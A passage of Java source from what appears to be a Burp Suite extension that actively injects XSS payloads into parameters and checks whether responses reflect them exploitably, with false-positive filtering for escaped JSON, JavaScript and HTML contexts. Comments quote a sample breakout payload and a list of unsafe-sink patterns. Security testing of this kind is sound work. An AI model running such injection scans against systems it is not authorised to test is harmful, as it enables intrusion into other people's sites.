                                                             encodedPayload.substring(0, Math.min(30, encodedPayload.length())) + 
                                                             ", found " + decodedPayload.substring(0, Math.min(30, decodedPayload.length())));
                                    }
                                }
                            } catch (Exception e) {
                                // Ignore decode errors, continue checking
                            }
                        }
                        
                        // CRITICAL: Do NOT use partial reflection as fallback - this causes false positives
                        // Only accept ACTUAL payload reflection (direct, decoded, or URL-encoded)
                        // Partial matches are NOT sufficient proof of vulnerability
                        
                        // CRITICAL: If payload is not reflected, skip (false positive)
                        if (!payloadReflectedExplicit) {
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED in doActiveScan: Payload NOT reflected in response for parameter: " + insertionPointName);
                            callbacks.printOutput("[XSSDetector] Payload: " + payload.substring(0, Math.min(50, payload.length())));
                            callbacks.printOutput("[XSSDetector] Encoded payload: " + (encodedPayload != null ? encodedPayload.substring(0, Math.min(50, encodedPayload.length())) : "null"));
                            // Debug: Show what we're looking for
                            if (encodedPayload != null && !encodedPayload.equals(payload)) {
                                try {
                                    String decodedCheck = helpers.urlDecode(encodedPayload);
                                    callbacks.printOutput("[XSSDetector] Decoded check: " + (decodedCheck != null ? decodedCheck.substring(0, Math.min(50, decodedCheck.length())) : "null"));
                                } catch (Exception ignored) {}
                            }
                            continue; // Skip this payload - false positive
                        }
                        
                        // CRITICAL: Perform comprehensive advanced analysis to check for false positives
                        // Build parameter map for analysis
                        Map<String, Object> analysisParam = new HashMap<>();
                        analysisParam.put(Constants.NAME, insertionPointName);
                        analysisParam.put("ORIGINAL_PAYLOAD", payload);
                        analysisParam.put("ENCODED_PAYLOAD", encodedPayload);
                        analysisParam.put("CONTENT_TYPE", responseContentType);
                        AdvancedResponseAnalysis advancedAnalysis = analyzeResponseAdvanced(responseBody, payload, analysisParam);
                        
                        // FINAL VALIDATION LAYER: Comprehensive context-aware validation
                        boolean contextExploitable = true;
                        String validationFailureReason = null;
                        
                        // Check JavaScript string context
                        String reflectionContext = advancedAnalysis.getReflectionContext();
                        if (reflectionContext != null && 
                            (reflectionContext.contains("Script str") || reflectionContext.contains("JAVASCRIPT_STRING"))) {
                            boolean jsExploitable = isJavaScriptStringExploitable(responseBody, encodedPayload);
                            if (!jsExploitable) {
                                contextExploitable = false;
                                validationFailureReason = "JavaScript string safely escaped";
                                callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED in doActiveScan: " + validationFailureReason);
                            }
                        }
                        
                        // Check JSON string context
                        boolean isJSONContext = responseContentType != null && responseContentType.contains("application/json");
                        if (contextExploitable && isJSONContext) {
                            boolean jsonStrExploitable = isJSONStringExploitable(responseBody, encodedPayload);
                            if (!jsonStrExploitable) {
                                contextExploitable = false;
                                validationFailureReason = "JSON string safely escaped";
                                callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED in doActiveScan: " + validationFailureReason);
                            } else {
                                // Also check if JSON is exploitable (JSONP/unsafe consumption)
                                boolean jsonExpl = isJSONExploitable(responseBody, encodedPayload);
                                if (!jsonExpl) {
                                    contextExploitable = false;
                                    validationFailureReason = "JSON not exploitable (no JSONP/unsafe consumption)";
                                    callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED in doActiveScan: " + validationFailureReason);
                                }
                            }
                        }
                        
                        // Check HTML encoding
                        if (contextExploitable && !advancedAnalysis.isJavaScriptExecution()) {
                            boolean htmlEncoded = isPayloadHTMLEncoded(responseBody, encodedPayload);
                            if (htmlEncoded) {
                                contextExploitable = false;
                                validationFailureReason = "Payload HTML-encoded and not in JavaScript execution context";
                                callbacks.printOutput("[XSSDetector] FINAL VALIDATION FAILED in doActiveScan: " + validationFailureReason);
                            }
                        }
                        
                        // CRITICAL: Filter false positives - if confidence is 0 or context is not vulnerable, skip
                        if (!contextExploitable || advancedAnalysis.getConfidence() <= 0.0 || 
                            (!advancedAnalysis.isContextVulnerable() && !advancedAnalysis.isDirectReflection() && !advancedAnalysis.isJavaScriptExecution())) {
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED in doActiveScan: " + 
                                (validationFailureReason != null ? validationFailureReason : "Confidence too low or not exploitable") + 
                                " for parameter: " + insertionPointName);
                            continue; // Skip this payload - false positive
                        }
                        
                        // CRITICAL FINAL VALIDATION: Verify payload is ACTUALLY in request AND reflected in response
                        // This is the ABSOLUTE FINAL check before marking as CONFIRMED
                        String requestStr = new String(testRequest, StandardCharsets.UTF_8);
                        boolean payloadInRequest = requestStr.contains(encodedPayload) || requestStr.contains(payload);
                        
                        // Check for URL-encoded payload in request if we injected encoded
                        if (!payloadInRequest && !encodedPayload.equals(payload)) {
                            // Check if encoded payload appears in query string
                            int queryStart = requestStr.indexOf("?");
                            if (queryStart >= 0) {
                                String queryString = requestStr.substring(queryStart);
                                if (queryString.contains(insertionPointName + "=" + encodedPayload) ||
                                    queryString.contains(helpers.urlEncode(insertionPointName) + "=" + encodedPayload)) {
                                    payloadInRequest = true;
                                }
                            }
                        }
                        
                        // Verify payload is reflected in response (already checked above, but double-check)
                        boolean payloadInResponse = responseBody.contains(encodedPayload) || responseBody.contains(payload);
                        if (!payloadInResponse && !encodedPayload.equals(payload)) {
                            try {
                                String decoded = helpers.urlDecode(encodedPayload);
                                if (decoded != null && responseBody.contains(decoded)) {
                                    payloadInResponse = true;
                                }
                            } catch (Exception ignored) {}
                        }
                        
                        // CRITICAL: Only mark as CONFIRMED if we have PROOF in both request AND response
                        if (!payloadInRequest || !payloadInResponse) {
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED: Payload not in request (" + payloadInRequest + ") or response (" + payloadInResponse + ")");
                            callbacks.printOutput("[XSSDetector] Request check: " + (payloadInRequest ? "PASS" : "FAIL"));
                            callbacks.printOutput("[XSSDetector] Response check: " + (payloadInResponse ? "PASS" : "FAIL"));
                            continue; // Skip - no proof
                        }
                        
                        // FINAL VALIDATION PASSED - Proceed with issue creation
                        callbacks.printOutput("[XSSDetector] FINAL VALIDATION PASSED in doActiveScan: Payload confirmed in request AND response - creating issue");
                        
                        // Create confirmed vulnerability data with actual request/response
                            Map<String, Object> vulnerabilityData = new HashMap<>();
                            vulnerabilityData.put("paramName", insertionPointName);
                            // Store the encoded payload that was actually injected
                            vulnerabilityData.put("payload", encodedPayload);
                            vulnerabilityData.put("ORIGINAL_PAYLOAD", payload);
                            vulnerabilityData.put("ENCODED_PAYLOAD", encodedPayload); // Store as String for display
                            vulnerabilityData.put("IS_ENCODED", !encodedPayload.equals(payload)); // Store boolean flag for encoding check
                            vulnerabilityData.put("SCAN_TYPE", "Advanced");
                            // CRITICAL: Only set CONFIRMED_XSS = true AFTER we've verified payload in request AND response
                            vulnerabilityData.put("CONFIRMED_XSS", true);
                            // Use confidence from advanced analysis - ensure minimum threshold for confirmed findings
                            double confidenceScore = advancedAnalysis.getConfidence();
                            // CRITICAL FIX: For confirmed reflections, set minimum confidence of 75%
                            if (confidenceScore < 75.0) {
                                confidenceScore = 75.0; // Minimum for confirmed reflection
                            }
                            vulnerabilityData.put("CONFIDENCE_SCORE", confidenceScore);
                            vulnerabilityData.put("XSS_SCORE", 85.0);
                            vulnerabilityData.put("REFLECTION_CONTEXT", reflectionContext);
                            vulnerabilityData.put("ENHANCED_CONTEXT", "Active scan confirmed XSS - Content-Type: " + responseContentType);
                            // Store test request/response for proof
                            vulnerabilityData.put("TEST_REQUEST", testRequest);
                            vulnerabilityData.put("TEST_RESPONSE", responseBytes);
                            vulnerabilityData.put("CONTENT_TYPE", responseContentType);
                            boolean isJSON = responseContentType != null && responseContentType.toLowerCase().contains("application/json");
                            vulnerabilityData.put("IS_JSON_RESPONSE", isJSON);

                            // Create scan issue - try simplified method first
                            EnhancedIssueReporter issueReporter = new EnhancedIssueReporter(helpers, callbacks, settings);

                            // Try enhanced method first (proper validation + markers)
                            IScanIssue issue = issueReporter.createEnhancedXSSIssue(testResponse, vulnerabilityData);

                            // Fallback to simplified method only for confirmed findings
                            if (issue == null && Boolean.TRUE.equals(vulnerabilityData.get("CONFIRMED_XSS"))) {
                                issue = issueReporter.createXSSIssue(testResponse, vulnerabilityData);
                            }

                            if (issue != null) {
                                issues.add(issue);
                                // CRITICAL: Also directly report to Burp
                                try {
                                    callbacks.addScanIssue(issue);
                                    callbacks.printOutput("[EnhancedAggressive] ISSUE REPORTED: " + insertionPointName +
                                        " (confidence: " + confidenceScore + "%)");
                                } catch (Exception ex) {
                                    callbacks.printOutput("[EnhancedAggressive] Issue added to list: " + insertionPointName);
                                }
                            }

                            // Found confirmed vulnerability, no need to test more payloads
                            break;
                        }
                    
                } catch (Exception e) {
                    callbacks.printError("Error testing payload: " + e.getMessage());
                }
            }
            
        } catch (Exception e) {
            callbacks.printError("Error in active scan: " + e.getMessage());
        }
        
        return issues;
    }
    
    /**
     * Get response content type
     */
    private String getResponseContentType(IHttpRequestResponse requestResponse) {
        try {
            IResponseInfo responseInfo = helpers.analyzeResponse(requestResponse.getResponse());
            List<String> headers = responseInfo.getHeaders();
            
            for (String header : headers) {
                if (header.toLowerCase().startsWith("content-type:")) {
                    String contentType = header.substring(13).trim().split(";")[0].trim();
                    return contentType;
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return null;
    }
    
    /**
     * Check if content type is vulnerable to XSS
     */
    /**
     * CRITICAL: Check if content type is enabled in Settings
     * Only scan content types that are explicitly enabled by user
     */
    private boolean isVulnerableContentType(String contentType) {
        if (contentType == null || settings == null) return false;
        
        // Get enabled content types from Settings
        ArrayList<String> enabledContentTypes = settings.getEnabledContentTypes();
        
        // If no content types are enabled, default to text/html and application/json only
        if (enabledContentTypes == null || enabledContentTypes.isEmpty()) {
            String lowerContentType = contentType.toLowerCase();
            return lowerContentType.contains("text/html") || lowerContentType.contains("application/json");
        }
        
        // Check if this content type is enabled
        String lowerContentType = contentType.toLowerCase();
        for (String enabledType : enabledContentTypes) {
            if (enabledType != null) {
                String lowerEnabledType = enabledType.toLowerCase();
                // Match if content type contains enabled type or vice versa
                if (lowerContentType.contains(lowerEnabledType) || lowerEnabledType.contains(lowerContentType)) {
                    return true;
                }
            }
        }
        
        return false;
    }
    
    /**
     * Check if response indicates XSS vulnerability with content-type awareness
     */
    private boolean isXSSVulnerable(String responseBody, String payload, String contentType) {
        if (responseBody == null || payload == null) {
            return false;
        }
        
        String lowerContentType = contentType != null ? contentType.toLowerCase() : "";
        boolean isJSON = lowerContentType.contains("application/json");
        boolean isHTML = lowerContentType.contains("text/html") || lowerContentType.contains("application/xhtml+xml");
        boolean isJavaScript = lowerContentType.contains("application/javascript") || lowerContentType.contains("text/javascript");
        boolean isCSS = lowerContentType.contains("text/css");
        boolean isSVG = lowerContentType.contains("image/svg+xml") || lowerContentType.contains("image/svg");
        
        // Check for direct payload reflection (most reliable indicator)
        if (responseBody.contains(payload)) {
            // CRITICAL: For JSON, verify it's actually exploitable before returning true
            if (isJSON) {
                return isJSONExploitable(responseBody, payload);
            }
            return true;
        }
        
        // For JSON responses, check for JSON-encoded payload
        if (isJSON) {
            // Check for JSON string encoding (escaped quotes)
            String jsonEncoded = payload.replace("\"", "\\\"").replace("\\", "\\\\");
            if (responseBody.contains(jsonEncoded)) {
                // CRITICAL: Verify JSON is exploitable (JSONP or unsafe consumption)
                return isJSONExploitable(responseBody, payload);
            }
            
            // Check for unicode encoding in JSON
            String unicodeEncoded = payload.replace("<", "\\u003c").replace(">", "\\u003e");
            if (responseBody.contains(unicodeEncoded)) {
                // CRITICAL: Verify JSON is exploitable
                return isJSONExploitable(responseBody, payload);
            }
            
            // Check if payload appears in JSON string values (between quotes)
            Pattern jsonStringPattern = Pattern.compile("\"([^\"]*" + Pattern.quote(payload) + "[^\"]*)\"");
            if (jsonStringPattern.matcher(responseBody).find()) {
                // CRITICAL: Verify JSON is exploitable
                return isJSONExploitable(responseBody, payload);
            }
        }
        
        // For JavaScript content types, check for JavaScript string encoding
        if (isJavaScript) {
            // JavaScript files can contain XSS if payload is in string context
            // Check for direct payload or escaped versions
            if (responseBody.contains(payload)) {
                return true;
            }
            // Check for JavaScript string escaping
            String jsEscaped = payload.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'");
            if (responseBody.contains(jsEscaped)) {
                // Check if it's in a string context (between quotes)
                int escapedIndex = responseBody.indexOf(jsEscaped);
                if (escapedIndex >= 0) {
                    // Check surrounding context for quotes
                    int before = Math.max(0, escapedIndex - 10);
                    int after = Math.min(responseBody.length(), escapedIndex + jsEscaped.length() + 10);
                    String surrounding = responseBody.substring(before, after);
                    if (surrounding.contains("\"") || surrounding.contains("'")) {
                        return true; // In string context - exploitable if quote can break out
                    }
                }
            }
        }
        
        // For CSS content types, check for CSS injection
        if (isCSS) {
            // CSS can execute JavaScript via expression() or url(javascript:)
            if (responseBody.contains(payload)) {
                // Check if payload is in CSS execution context
                int payloadIndex = responseBody.indexOf(payload);
                if (payloadIndex >= 0) {
                    int before = Math.max(0, payloadIndex - 100);
                    String beforeContext = responseBody.substring(before, payloadIndex);
                    if (beforeContext.contains("expression(") || beforeContext.contains("url(javascript:") ||
                        beforeContext.contains("@import")) {
                        return true; // CSS execution context
                    }
                }
            }
        }
        
        // For SVG content types, check for SVG XSS
        if (isSVG) {
            // SVG can execute JavaScript in event handlers
            if (responseBody.contains(payload)) {
                // Check if payload is in SVG event handler
                int payloadIndex = responseBody.indexOf(payload);
                if (payloadIndex >= 0) {
                    int before = Math.max(0, payloadIndex - 100);
                    String beforeContext = responseBody.substring(before, payloadIndex);
                    if (beforeContext.contains("onload") || beforeContext.contains("onerror") ||
                        beforeContext.contains("onclick")) {
                        return true; // SVG event handler context
                    }
                }
            }
        }
        
        // For HTML responses, check for HTML entity encoding
        if (isHTML) {
            String htmlEncoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                                       .replace("\"", "&quot;").replace("'", "&#39;");
            if (responseBody.contains(htmlEncoded)) {
                return true;
            }
            
            // CRITICAL: Also check for URL-decoded version if payload is URL-encoded
            // This handles cases where we inject %3Cscript%3E but app reflects <script>
            try {
                String urlDecoded = helpers.urlDecode(payload);
                if (urlDecoded != null && !urlDecoded.equals(payload) && responseBody.contains(urlDecoded)) {
                    return true;
                }
            } catch (Exception e) {
                // Ignore decode errors
            }
        
            // Check for URL encoding
        String urlEncoded = helpers.urlEncode(payload);
        if (responseBody.contains(urlEncoded)) {
            return true;
            }
        }
        
        // CRITICAL FIX: Do NOT use partial reflection - this causes false positives
        // Partial matches are NOT sufficient proof of vulnerability
        // Only accept ACTUAL payload reflection (direct, decoded, or URL-encoded)
        // Check for partial payload reflection - REMOVED (too lenient)
        // String[] payloadParts = payload.split("[<>\"'()\\[\\]{}]");
        // int foundParts = 0;
        // for (String part : payloadParts) {
        //     if (part.length() > 3 && responseBody.contains(part)) {
        //         foundParts++;
        //     }
        // }
        // 
        // return foundParts >= Math.max(1, payloadParts.length / 2); // NO - too lenient
        
        return false; // Payload not reflected - not exploitable
    }
    
    /**
     * CRITICAL: Check if JSON reflection is actually exploitable
     * JSON is NOT directly executable - only JSONP or unsafe consumption makes it exploitable
     */
    public boolean isJSONExploitable(String responseBody, String payload) {
        if (responseBody == null || responseBody.trim().isEmpty()) {
            return false;
        }
        
        // Check 1: JSONP - Directly executable as JavaScript
        // JSONP pattern: callbackName({...}) or callbackName([...])
        // CRITICAL FIX: Restrict to known JSONP callback naming patterns to avoid matching
        // regular function calls like console.log({}) or handleResponse({})
        Pattern jsonpPattern = Pattern.compile(
            "^\\s*(?:callback|jsonp|jsonpcallback|cb|jsoncallback|jQuery\\w+|__jp\\w*|angular\\.callbacks\\._\\w+)\\s*\\(\\s*[\\{\\[].*[\\}\\]]\\s*\\)\\s*;?\\s*$",
            Pattern.DOTALL | Pattern.CASE_INSENSITIVE);
        if (jsonpPattern.matcher(responseBody.trim()).find()) {
            callbacks.printOutput("[XSSDetector] JSONP detected - JSON is directly executable");
            return true;
        }
        // Also check generic pattern but ONLY if the function name looks like a callback
        // (starts with a parameter value or ends with "callback"/"Callback")
        Pattern genericJsonpPattern = Pattern.compile(
            "^\\s*[\\w$]+(?:[Cc]allback|_cb|_jsonp)\\s*\\(\\s*[\\{\\[].*[\\}\\]]\\s*\\)\\s*;?\\s*$",
            Pattern.DOTALL);
        if (genericJsonpPattern.matcher(responseBody.trim()).find()) {
            callbacks.printOutput("[XSSDetector] JSONP callback pattern detected - JSON is directly executable");
            return true;
        }
        
        // Check 2: Removed — crude substring matching for "callback(" causes false positives
        // when JSON contains the word "callback" as a field name. The JSONP regex above (Check 1)
        // already handles real JSONP patterns correctly.
        
        // Check 3: Check for unsafe JSON consumption indicators in response
        // Look for patterns suggesting JSON is used with eval(), innerHTML, etc.
        String[] unsafePatterns = {
            "eval\\s*\\(", "Function\\s*\\(", "setTimeout\\s*\\(", "setInterval\\s*\\(",
            "\\.innerHTML\\s*=", "\\.outerHTML\\s*=", "insertAdjacentHTML", "document\\.write",
            "dangerouslySetInnerHTML", "v-html", "ng-bind-html", "ReactDOM\\.render"
        };
        
        for (String pattern : unsafePatterns) {
            if (Pattern.compile(pattern, Pattern.CASE_INSENSITIVE).matcher(responseBody).find()) {
                callbacks.printOutput("[XSSDetector] Unsafe JSON consumption pattern detected: " + pattern);
                return true;
            }
        }
        
        // Check 4: Check for dangerous field names in JSON (suggests unsafe usage)
        // "content" and "html" removed — too common in normal APIs
        String[] dangerousFields = {"innerHTML", "outerHTML", "script", "eval", "onclick", "onload"};
        for (String field : dangerousFields) {
            Pattern fieldPattern = Pattern.compile("\"" + Pattern.quote(field) + "\"\\s*:", Pattern.CASE_INSENSITIVE);
            if (fieldPattern.matcher(responseBody).find()) {
                callbacks.printOutput("[XSSDetector] Dangerous JSON field detected: " + field + " - suggests unsafe usage");
                return true;
            }
        }
        
        // Check 5: Check for HTML/script content in JSON values (suggests innerHTML usage)
        if (responseBody.contains("<script") || responseBody.contains("</script>") || 
            responseBody.contains("<img") || responseBody.contains("<svg") ||
            responseBody.contains("javascript:") || responseBody.contains("onerror=")) {
            callbacks.printOutput("[XSSDetector] HTML/script content in JSON detected - suggests unsafe DOM manipulation");
            return true;
        }
        
        // Check 6: For real-time applications (SPA), check for common unsafe patterns
        // React: dangerouslySetInnerHTML, v-html (Vue), ng-bind-html (Angular)
        if (responseBody.contains("dangerouslySetInnerHTML") || responseBody.contains("__html") ||
            responseBody.contains("v-html") || responseBody.contains("ng-bind-html") ||
            responseBody.contains("innerHTML") || responseBody.contains("outerHTML")) {
            callbacks.printOutput("[XSSDetector] SPA unsafe HTML rendering pattern detected");
            return true;
        }
        
        // Check 7: Check if JSON is in a script tag (rare but dangerous)
        if (responseBody.contains("<script") && responseBody.contains("application/json")) {
            callbacks.printOutput("[XSSDetector] JSON in script tag detected - may be executed");
            return true;
        }
        
        // If none of the above, JSON is likely safe (standard JSON.parse() usage)
        callbacks.printOutput("[XSSDetector] JSON reflection detected but no exploitation indicators found - likely safe JSON.parse() usage");
        return false;
    }
    
    /**
     * CRITICAL: Check if JSON string reflection is actually exploitable
     * A payload reflected in a JSON string is only exploitable if quotes/backslashes are NOT escaped
     * If quotes are escaped (e.g., '\\\"'), it's safely contained and NOT exploitable
     * 
     * Example: Payload '\";alert(1);//' reflected as '\\\";alert(1);//' in JSON is safely escaped
     */
    public boolean isJSONStringExploitable(String responseBody, String payload) {
        if (responseBody == null || payload == null || responseBody.trim().isEmpty() || payload.trim().isEmpty()) {
            return false;
        }
        
        // CRITICAL: Check if payload is reflected in JSON-escaped form
        // Example: payload \";alert(1);// reflected as \\\";alert(1);//
        // Pattern: \\\" means escaped backslash (\\), then escaped quote (\")
        
        // First, try to find the payload directly
        int payloadIndex = responseBody.indexOf(payload);
        
        // If not found, check for JSON-escaped version
        // In JSON: \ becomes \\, " becomes \"
        // So \"; becomes \\\";
        if (payloadIndex < 0) {
            // Check for escaped version: look for \\\" pattern where payload has \"
            if (payload.contains("\\\"") || payload.startsWith("\\\"") || payload.contains("\"")) {
                // Try to find the escaped pattern
                // For payload \";alert(1);//, escaped would be \\\";alert(1);//
                // We need to check if we see \\\" in the response
                
                // Extract the part before the quote to find it in response
                int quoteIndex = payload.indexOf("\"");
                if (quoteIndex >= 0) {
                    String beforeQuote = payload.substring(0, quoteIndex);
                    String afterQuote = payload.substring(quoteIndex + 1);
                    
                    // In JSON, \ becomes \\ and " becomes \"
                    // So if payload is \";, in JSON it becomes \\\";
                    // Check if we see \\\" followed by the rest
                    String escapedPattern = beforeQuote.replace("\\", "\\\\") + "\\\\\"" + afterQuote;
                    if (responseBody.contains(escapedPattern)) {
                        callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Payload is JSON-escaped (\\\" pattern detected) - safely contained");
                        return false; // Not exploitable - safely escaped
                    }
                    
                    // Also check for the specific \\\" pattern anywhere near where payload should be
                    // Look for JSON string patterns like "10":"\\\";alert(1);//"
                    Pattern jsonStringPattern = Pattern.compile("\"[^\"]*\":\"([^\"]*" + Pattern.quote(escapedPattern) + "[^\"]*)\"");
                    Matcher matcher = jsonStringPattern.matcher(responseBody);
                    if (matcher.find()) {
                        String jsonValue = matcher.group(1);
                        // Check if the quote in the payload is escaped (has \\ before it)
                        if (jsonValue.contains("\\\\\"")) {
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Payload in JSON string with escaped quote (\\\\\") - safely contained");
                            return false; // Not exploitable - safely escaped
                        }
                    }
                }
            }
        }
        
        // Check if payload contains quotes or backslashes that would need escaping
        if (payload.contains("\"") || payload.contains("\\")) {
            // Find where the payload appears in the response (reuse payloadIndex if already found)
            if (payloadIndex < 0) {
                payloadIndex = responseBody.indexOf(payload);
            }
            if (payloadIndex < 0) {
                // Try case-insensitive
                String lowerResponse = responseBody.toLowerCase();
                String lowerPayload = payload.toLowerCase();
                payloadIndex = lowerResponse.indexOf(lowerPayload);
                if (payloadIndex >= 0) {
                    // Convert back to original case position
                    payloadIndex = responseBody.toLowerCase().indexOf(lowerPayload);
                }
            }
            
            if (payloadIndex >= 0) {
                // Check if we're inside a JSON string (between double quotes)
                // Look backwards for the opening quote
                int quoteStart = -1;
                for (int i = payloadIndex - 1; i >= 0 && i >= payloadIndex - 500; i--) {
                    char c = responseBody.charAt(i);
                    if (c == '"') {
                        // Count backslashes before this quote
                        int backslashCount = 0;
                        for (int j = i - 1; j >= 0 && responseBody.charAt(j) == '\\'; j--) {
                            backslashCount++;
                        }
                        // If even number of backslashes, quote is not escaped (it's the string delimiter)
                        if (backslashCount % 2 == 0) {
                            quoteStart = i;
                            break;
                        }
                    }
                }
                
                if (quoteStart >= 0) {
                    // We're inside a JSON string - check if quotes in payload are escaped
                    // Look at each quote in the payload
                    for (int i = 0; i < payload.length(); i++) {
                        if (payload.charAt(i) == '"') {
                            int quotePos = payloadIndex + i;
                            if (quotePos < responseBody.length()) {
                                // Count backslashes before this quote in the response
                                int backslashCount = 0;
                                for (int j = quotePos - 1; j >= quoteStart + 1 && responseBody.charAt(j) == '\\'; j--) {
                                    backslashCount++;
                                }
                                // In JSON, an escaped quote has an ODD number of backslashes before it
                                // Example: \" has 1 backslash (odd) = escaped, \\" has 2 backslashes (even) = not escaped
                                if (backslashCount % 2 == 1) {
                                    // Quote is escaped - safely contained
                                    callbacks.printOutput("[XSSDetector] FALSE POSITIVE: JSON string quote is safely escaped (backslash count: " + backslashCount + ")");
                                    return false; // Not exploitable - safely escaped
                                }
                            }
                        }
                    }
                    
                    // Check for escaped backslashes
                    for (int i = 0; i < payload.length(); i++) {
                        if (payload.charAt(i) == '\\') {
                            int backslashPos = payloadIndex + i;
                            if (backslashPos < responseBody.length() - 1) {
                                // In JSON, an escaped backslash is \\
                                // Check if we have \\ in the response at this position
                                if (backslashPos + 1 < responseBody.length() && responseBody.charAt(backslashPos + 1) == '\\') {
                                    // Count backslashes before this position
                                    int backslashCount = 0;
                                    for (int j = backslashPos - 1; j >= quoteStart + 1 && responseBody.charAt(j) == '\\'; j--) {
                                        backslashCount++;
                                    }
                                    // If even number before, the \\ is an escaped backslash
                                    // If odd number before, the first \ escapes something else
                                    // For now, if we see \\, it's likely escaped
                                    if (backslashCount % 2 == 0) {
                                        callbacks.printOutput("[XSSDetector] FALSE POSITIVE: JSON string backslash is escaped");
                                        return false; // Not exploitable - safely escaped
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        // If we get here, the payload is not safely escaped in JSON
        // But we still need to check for JSONP or unsafe consumption to determine exploitability
        return true; // Might be exploitable (but check JSON exploitability separately)
    }
    
    /**
     * CRITICAL: Check if JavaScript string reflection is actually exploitable
     * A payload reflected in a JavaScript string is only exploitable if the quote can break out
     * If the quote is escaped (e.g., '\\\"'), it's a false positive
     */
    public boolean isJavaScriptStringExploitable(String responseBody, String payload) {
        if (responseBody == null || payload == null || responseBody.trim().isEmpty() || payload.trim().isEmpty()) {
            return false;
        }
        
        // Find where the payload is reflected
        int payloadIndex = responseBody.indexOf(payload);
        if (payloadIndex < 0) {
            // Try case-insensitive
            String lowerResponse = responseBody.toLowerCase();
            String lowerPayload = payload.toLowerCase();
            payloadIndex = lowerResponse.indexOf(lowerPayload);
        }
        
        if (payloadIndex < 0) {
            // Payload not found - cannot be exploitable
            return false;
        }
        
        // Extract context around the payload (500 chars before and after)
        int contextStart = Math.max(0, payloadIndex - 500);
        int contextEnd = Math.min(responseBody.length(), payloadIndex + payload.length() + 500);
        String context = responseBody.substring(contextStart, payloadIndex + payload.length());
        int relativePayloadIndex = payloadIndex - contextStart;
        
        // Find the string literal containing the payload
        // Look for single or double quotes before the payload
        int stringStart = -1;
        char quoteChar = 0;
        
        // Search backwards from payload to find the opening quote
        for (int i = relativePayloadIndex - 1; i >= 0; i--) {
            char c = context.charAt(i);
            if (c == '\'' || c == '"') {
                // Check if this quote is escaped
                int backslashCount = 0;
                for (int j = i - 1; j >= 0 && context.charAt(j) == '\\'; j--) {
                    backslashCount++;
                }
                // If even number of backslashes, quote is not escaped (it's the string delimiter)
                // If odd number, quote is escaped (part of string content)
                if (backslashCount % 2 == 0) {
                    stringStart = i;
                    quoteChar = c;
                    break;
                }
            }
        }
        
        if (stringStart < 0) {
            // No string literal found - might be in code context, check if exploitable
            // Look for patterns like: variable = payload or variable(payload)
            String beforePayload = context.substring(0, relativePayloadIndex);
            if (beforePayload.matches(".*[=:]\\s*['\"]?$") || beforePayload.matches(".*\\(\\s*['\"]?$")) {
                // Looks like assignment or function call - might be exploitable
                return true;
            }
            return false;
        }
        
        // Extract the string content (between quotes)
        String stringContent = context.substring(stringStart + 1);
        
        // Find where the payload appears in the string content
        // CRITICAL: We need to find the actual reflection, which might be escaped
        // Try to find the payload as-is first
        int payloadInStringIndex = stringContent.indexOf(payload);
        
        // If not found, try to find escaped versions
        if (payloadInStringIndex < 0) {
            // Try JSON-escaped version (common in JavaScript strings)
            String jsonEscaped = payload.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'");
            payloadInStringIndex = stringContent.indexOf(jsonEscaped);
            if (payloadInStringIndex >= 0) {
                // Found escaped version - check if the escape prevents exploitation
                // Extract the actual reflected string (with escapes)
                String actualReflection = jsonEscaped;
                String beforeReflection = stringContent.substring(0, payloadInStringIndex);
                
                // Count backslashes before the reflection
                int backslashCount = 0;
                for (int i = beforeReflection.length() - 1; i >= 0 && beforeReflection.charAt(i) == '\\'; i--) {
                    backslashCount++;
                }
                
                // If odd number of backslashes before, the reflection is escaped
                if (backslashCount % 2 == 1) {
                    callbacks.printOutput("[XSSDetector] FALSE POSITIVE: Payload reflection is escaped (backslash count: " + backslashCount + ")");
                    return false;
                }
                
                // Check if the quote in the escaped payload can break out
                // In '\\\"', the \\ becomes \, and \" becomes " (in single-quoted string)
                // So '\\\"' = \" (backslash + quote) - the quote is NOT escaped to break out
                // But we need to check the actual context
                
                // For now, if we found an escaped version, it's likely not exploitable
                // unless we can verify the quote can break out
                callbacks.printOutput("[XSSDetector] Payload found in escaped form - checking exploitability");
            }
        }
        
        if (payloadInStringIndex < 0) {
            // Payload not found in string - might be in different encoding
            return false;
        }
        
        // Check the characters immediately before the payload in the string
        String beforePayloadInString = stringContent.substring(0, payloadInStringIndex);
        
        // Count unescaped backslashes before the payload
        // If there's an odd number of backslashes before a quote in the payload, the quote is escaped
        if (payload.contains("\"") || payload.contains("'")) {
            // Check if the quote in the payload is escaped
            // Look at the last character(s) before the payload
            int backslashCount = 0;
            for (int i = beforePayloadInString.length() - 1; i >= 0 && beforePayloadInString.charAt(i) == '\\'; i--) {
                backslashCount++;
            }
            
            // If odd number of backslashes, the next character (quote) is escaped
            // Check if payload starts with a quote
            if (payload.startsWith("\"") || payload.startsWith("'")) {
                if (backslashCount % 2 == 1) {
                    // Quote is escaped - cannot break out
                    callbacks.printOutput("[XSSDetector] FALSE POSITIVE: JavaScript string quote is escaped (backslash count: " + backslashCount + ")");
                    return false;
                }
            }
            
            // Also check if the payload contains a quote that would break out
            // Look for patterns like: \";alert(1);//
            // The key is: in a single-quoted string, \" is just a literal " (not escaped)
            // In a double-quoted string, \" is an escaped quote
            
            // Find the first quote in the payload
            int firstQuoteIndex = -1;
            for (int i = 0; i < payload.length(); i++) {
                if (payload.charAt(i) == '"' || payload.charAt(i) == '\'') {
                    firstQuoteIndex = i;
                    break;
                }
            }
            
            if (firstQuoteIndex >= 0) {
                // Check characters before this quote in the payload
                String beforeQuoteInPayload = payload.substring(0, firstQuoteIndex);
                int backslashCountInPayload = 0;
                for (int i = beforeQuoteInPayload.length() - 1; i >= 0 && beforeQuoteInPayload.charAt(i) == '\\'; i--) {
                    backslashCountInPayload++;
                }
                
                // CRITICAL: In a single-quoted string ('...'), \" is NOT an escape - it's literal backslash+quote
                // In a double-quoted string ("..."), \" IS an escape - it's just a quote
                // So we need to check based on the quote type
